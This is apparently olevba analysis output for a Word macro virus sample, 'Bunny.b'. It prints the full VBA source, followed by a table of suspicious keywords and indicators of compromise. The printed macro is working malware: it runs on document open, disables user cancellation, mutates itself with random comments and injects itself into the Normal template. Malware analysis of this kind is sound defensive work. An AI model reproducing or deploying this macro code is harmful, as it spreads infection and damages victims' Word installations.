olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bunny.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bunny.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public SCode As String
Public stuff As String
' W97T/Bunnies .b
' Word Trojan Bunnies .b variant by Error
Sub AutoOpen()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Options.SaveNormalPrompt = False
SCode = Dir("C:\windows\system\b.cpl")
If SCode = "b.cpl" Then Call Spread Else
ActiveDocument.VBProject.VBComponents("BunniesB").Export ("C:\Windows\System\b.cpl")
Call Spread
End Sub
Function Spread()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
' Begin to do what bunnies do...Now with exponential growth!!
For X = 1 To 10000 Step 1
Open "C:\windows\system\b.cpl" For Input As #3
Open "C:\Windows\system\bunnies.cpl" For Append As #4
Randomize Timer
Do
Line Input #3, stuff
Print #4, stuff
    Randomize Timer
    t = Int(Rnd(1) * 5) + 1
        If t = 1 Then Z$ = " '" & Application.UserAddress
        If t = 2 Then Z$ = " '" & Application.UserName
        If t = 3 Then Z$ = " '" & Time$
        If t = 4 Then Z$ = " '" & Application.UserInitials
        If t = 5 Then Z$ = " '" & Int(Rnd(1) * 9999999)
Print #4, Z$
        Loop Until stuff = "' EOF"
Close #3
Close #4
' Code Morpher from RAPE v2.0 (Random Arithmatic Polymorphic Engine) by Error
Kill "C:\Windows\System\b.cpl"
Dim OldName
Dim NewName
OldName = "C:\Windows\System\bunnies.cpl": NewName = "C:\Windows\System\b.cpl"
Name OldName As NewName
    With NormalTemplate.VBProject.VBComponents.Import("C:\Windows\System\b.cpl")
    End With
Next X
NormalTemplate.Save
MsgBox "Bunnies!!!!", 48
Kill "C:\Windows\System\Bunnies.cpl"
Kill "C:\Windows\System\B.cpl"
End Function
' EOF

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |b.cpl               |Executable file name                         |
|IOC       |bunnies.cpl         |Executable file name                         |
|IOC       |Bunnies.cpl         |Executable file name                         |
|IOC       |B.cpl               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

